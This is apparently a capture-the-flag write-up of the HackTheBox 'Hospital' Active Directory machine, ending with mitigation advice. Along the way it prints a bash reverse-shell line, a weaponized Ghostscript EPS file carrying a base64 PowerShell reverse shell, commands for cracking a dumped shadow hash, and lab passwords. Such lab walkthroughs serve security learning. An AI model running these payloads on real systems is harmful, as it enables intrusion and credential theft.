---
title: "HackTheBox - Hospital"
author: Nasrallah
description: ""
date: 2024-04-15 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, AD, rpd, cve, kernel, command injection, activedirectory, DC]
img_path: /assets/img/hackthebox/machines/hospital
image:
    path: hospital.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Hospital](https://www.hackthebox.com/machines/hospital) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is an Active Directory Domain Controller with a Linux container running a web server with an upload form that we abuse to get a shell on the VM. The linux kernel is vulnerable to GameOverlay that we exploit to get root access. As root we read hashes on the shadow file and crack one of them. With the new credentials we login to a web mail where we send a malicious file to a user who is going to open it with a vulnerable version of Ghostscript giving us a shell on the Windows host. A clear text password is found of a user, we RDP with that and find someone typing the administrator's password on the web mail.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.241                                                                                                                                                                                                   [37/461]
Host is up (0.28s latency).                                                                                                                                                                                                                 
Not shown: 980 filtered tcp ports (no-response)                                                                                                                                                                                             
PORT     STATE SERVICE           VERSION                                                                                                                                                                                                    
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                                              
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-05 16:43:01Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC     
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb                                                               
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time                                                                    
| tls-alpn: 
|_  http/1.1        
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?     
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03                                                                               
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?                                                                                                  
2103/tcp open  msrpc             Microsoft Windows RPC                                                                
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-05T16:44:02+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-02-04T11:02:55
|_Not valid after:  2024-08-05T11:02:55
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-05T16:44:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
```

The scan reveals we have an Active Directory Domain Controller with the domain name `DC.hospital.htb` and `hospital.htb`, let's add that to our `/etc/hosts` file.

But something unusual here is that we have port 22 and 8080 running on `Ubuntu` and another web server on port 443.

### Web

Let's check the web page on port 8080.

![login](1.png)

We got redirected to a login page. I tried some default credentials and sql injection but didn't work.

The next step is creating a user.

![register](2.png)

We registered an account now let's login.

![upload](3.png)

Here we see an upload form, since the website is coded with `php` let's try uploading a [php reverse shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php).

![error](4.png)

We failed to upload the shell and seems to only accept images.

#### Bypass the filter

First I tried adding a .png to my file `shell.php.png` and managed to upload it successfully.

![png](5.png)

Now we need to find where the files get uploaded to so let's run a directory scan.

```terminal
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://hospital.htb:8080/ -n      

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hospital.htb:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://hospital.htb:8080/ => login.php
301      GET        9l       28w      317c http://hospital.htb:8080/css => http://hospital.htb:8080/css/
301      GET        9l       28w      319c http://hospital.htb:8080/fonts => http://hospital.htb:8080/fonts/
301      GET        9l       28w      320c http://hospital.htb:8080/images => http://hospital.htb:8080/images/
301      GET        9l       28w      316c http://hospital.htb:8080/js => http://hospital.htb:8080/js/
301      GET        9l       28w      321c http://hospital.htb:8080/uploads => http://hospital.htb:8080/uploads/
301      GET        9l       28w      320c http://hospital.htb:8080/vendor => http://hospital.htb:8080/vendor/

```

We found the `/uploads` directory, now let's check the file at `/uploads/shell.php.png`

![uploads](6.png)

The file is there but it didn't get executed.

Since we managed to bypass the upload filter by adding `.png` at the end we safely say that the filter is checking the extension at the end of the file.

To determine if it's a white or black list filter I tried upload a random extension `shell.asdfas`

![success](5.png)

We confirmed that the filter is using a black list blocking any `php` extension, but the question here is **Does it block EVERY php extension?**.

To find out we can use `Burp Suite intruder`.

#### Burp Suite

We intercept an upload request and send it to `intruder`

![intruder](7.png)

We add the `php` and click add.

Now we add the possible php extension in the `Payloads` tab.

![payloads](8.png)

Now let's run the attack.

![phar](9.png)

We find that `phar` can be uploaded.

## **Foothold**

Let's setup a listener and go to `/uploads/shell.phar`.

![failed](10.png)

The file failed to start a shell. I tried other php reverse shell here but all didn't work.

A friend of mine suggested to use [p0wny's shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) so I tried it and it worked.

![shell](11.png)

We got a web shell, now let's get a reverse shell.

I'll write the following command to a file and call it shell.sh.

```bash
bash -i >& /dev/tcp/10.10.16.74/9001 0>&1
```

Now I'll setup a listener and run the file.

![reverse shell](12.png)

We got a shell.

## **Privilege Escalation**

### www-data -> root

After some long enumeration a running automated script I found nothing.

The last thing to check is the kernel with the command `uname -a`.

```terminal
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Checking the version on google reveals it's vulnerable to `CVE-2023-35001`, here is the <https://github.com/synacktiv/CVE-2023-35001>.

After building the exploit, we upload the `exploit` and `wrapper` files and run them.

![pe](13.png)

We got root! But we're still in the linux system.

### Linux -> Windows

There is a user called `drwilliams`, let's check her hash from the `/etc/shadow` file.

```bash
# cat /etc/shadow
root:$y$j9T$gFEwUHymkyl3BtZ7/LDhw/$XUiWJ0nNGDVo7nf1t6RRuUHH9JOIxxkUwKuki7N3.CD:19765:0:99999:7:::
daemon:*:19462:0:99999:7:::
[...]
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

#### hashcat

Let's crack the hash.

```bash
hashcat -m 1800 crack.hash rockyou.txt

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
Time.Started.....: Mon Feb 12 19:07:23 2024 (4 mins, 14 secs)
Time.Estimated...: Mon Feb 12 19:11:37 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      846 H/s (6.84ms) @ Accel:16 Loops:64 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 214528/14344384 (1.50%)
Rejected.........: 0/214528 (0.00%)
Restore.Point....: 214016/14344384 (1.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: rayburn -> pkpkpk

```

We got the password.

I tried using it on `win-rm` but it didn't work.

#### Mail

Let's navigate to the https page `https://hospital.htb`.

![mail](14.png)

We got a login page, let's try `drwilliams:qwe123!@#`

![logged](15.png)

This is an email web application. We can find one email from `drbrown` saying that we can send him an `.eps` file and he'll open it using a program called `Ghostscript`.

Searching for `Ghostscript exploit` on google we find recent command injection vulnerability `CVE-2023-36664` and here is the exploit <https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>

The command to generate a malicious `.eps` file is the following:

```bash
python3 CVE_2023_36664_exploit.py --generate --payload calc --filename run_calculator --extension eps
```

I'll edit it so that it would send me a reverse shell.

I tired multiple payloads and the one that worked is a powershell base64 encoded command from <https://www.revshells.com/>

![shell](16.png)

My final command look like this:

```bash
python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --filename revshell --extension eps
```

Here is the `eps` file that just got generated:

```shell
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Welcome EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Welcome at vsociety!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
(%pipe%powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==) (w) file /DCTDecode filter
showpage
```

Now we send an email to `drbrown` with the file as an attachment.

![eps](17.png)

We setup a listener then send the email.

```terminal
┌──(sirius㉿kali)-[~/…/HTB/Machines/hospital]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.72] from (UNKNOWN) [10.10.11.241] 13893
whoami
hospital\drbrown
PS C:\Users\drbrown.HOSPITAL\Documents> dir ../desktop


    Directory: C:\Users\drbrown.HOSPITAL\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/12/2024   8:35 AM             34 user.txt                                                              


PS C:\Users\drbrown.HOSPITAL\Documents> 

```

We got a shell as `drbrown` on the windows box.

On the `Documents` folder we find `ghostscript.bat` file.

```terminal
PS C:\Users\drbrown.HOSPITAL\Documents> dir


    Directory: C:\Users\drbrown.HOSPITAL\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/23/2023   3:33 PM            373 ghostscript.bat                                                       


PS C:\Users\drbrown.HOSPITAL\Documents> cat ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
PS C:\Users\drbrown.HOSPITAL\Documents> 
```

This looks like an automated script to run the files we send to `drbrown` via email.

The file has `drbrown`'s password. Let's see if we can use it with `evil-winrm`

```terminal
$ evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'                
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

It worked!

### drbrown -> Administrator

Now I ran bloodhound to enumerate the machine and found out that user `drbrown` is part of `Remote Desktop Users`.

It's been a long time since I used RDP so I said to myself let me connect and what I found was shocking!

```bash
xfreerdp /u:drbrown /p:'chr!$br0wn' /v:hospital.htb /d:hospital.htb /dynamic-resolution +clipboard
```

![rdp](18.png)

There is an internet explorer windows open on the Mail application and some one is typing the administrator's credentials!

We let them finish typing and click on the show password icon to see the password.

Now let's see if the password works.

```terminal
$ evil-winrm -i hospital.htb -u administrator -p 'Th3B3stH0sp1t4l9786!'                             
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hospital\administrator
```

And just like that we got administrator.

## **Prevention and Mitigation**

## File upload

The filter used in the upload checks the file extension against a black list instead of a white list. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.

## CVEs

Always make sure to use the latest and safest versions.

The linux kernel should be changed to a safe one and same with `ghostscript`.

## Passwords

As you saw, one of the passwords was weak which allowed us to crack the hash easily. Not only that, but the password was reused in the mail application.

Passwords should be long and complex, avoid using the same password for more than one login and never store passwords in plain text but rather in a hashed format

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## References

<https://github.com/synacktiv/CVE-2023-35001>

<https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>

<https://portswigger.net/web-security/file-upload#how-to-prevent-file-upload-vulnerabilities>
